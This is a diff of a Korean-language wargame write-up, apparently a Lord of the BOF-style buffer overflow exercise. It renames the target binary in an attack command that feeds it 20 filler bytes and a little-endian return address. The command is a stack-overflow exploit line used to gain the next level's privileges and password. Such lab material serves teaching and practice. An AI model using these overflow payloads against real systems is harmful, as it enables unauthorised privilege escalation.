@@ -65,6 +65,6 @@ gcc -o shell shell.c
 *(주소는 little endian 방식으로 입력된다)*<br>
 <br>
 **공격 실시!**<br>
-```../gremlin `python -c 'print "A"*20+"\x82\xfe\xff\xbf"'` ```<br>
+```../cobolt `python -c 'print "A"*20+"\x82\xfe\xff\xbf"'` ```<br>
 ```my-pass```로 비밀번호를 물어보면<br>
 euid와 함께 비밀번호가 "~~". 라고 나올 것이다!!
